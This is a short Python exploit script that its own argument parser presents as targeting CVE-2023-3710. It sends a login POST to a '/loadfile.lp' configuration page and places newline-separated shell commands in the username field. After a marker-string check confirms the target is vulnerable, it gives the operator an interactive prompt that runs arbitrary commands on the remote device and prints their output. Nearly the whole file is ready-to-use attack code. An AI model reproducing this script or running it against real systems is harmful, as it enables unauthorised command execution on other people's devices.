#!/usr/bin/env python3

import os
import sys
import time
import requests
import argparse
from colorama import Fore

def exploit():            
  
    url = args.url + '/loadfile.lp?pageid=Configure'
    payload = "echo \"R3dcl1ff\";"
    
    req = requests.post(url, data={
                            'username': 'Test123\n' + payload + '\n',
                            'userpassword': 'Test123',
                            'login': 'Login'
                        })
    
    if "R3dcl1ff" in req.text:        
        print(Fore.GREEN + "[" + Fore.WHITE + "*" + Fore.GREEN + "] target is vulnerable")
        print(Fore.BLUE + "please wait...")
        time.sleep(2)
        print('pwned!')
    
        command = input('$ ')
        
        while True:
            if command == "exit":
                sys.exit(0)
            payload = "echo \"R3dcl1ff\";"  + command + ";echo \"R3dcl1ff\";"
            req = requests.post(url, data={
                            'username': 'Test123\n' + payload + '\n',
                            'userpassword': 'Test123',
                            'login': 'Login'
                         })
            
            print(req.text.split("R3dcl1ff")[1].strip())
            command = input('$ ')
    else:
        print(Fore.RED + "[" + Fore.WHITE + "-" + Fore.RED + "] target is not vulnerable")
        sys.exit(0)
        
if __name__ == '__main__':      
      parser = argparse.ArgumentParser(prog='CVE-2023-3710.py', description='This prog exploit CVE-2023-3710')
      parser.add_argument('-u', '--url')                                          
      args = parser.parse_args()
      exploit()
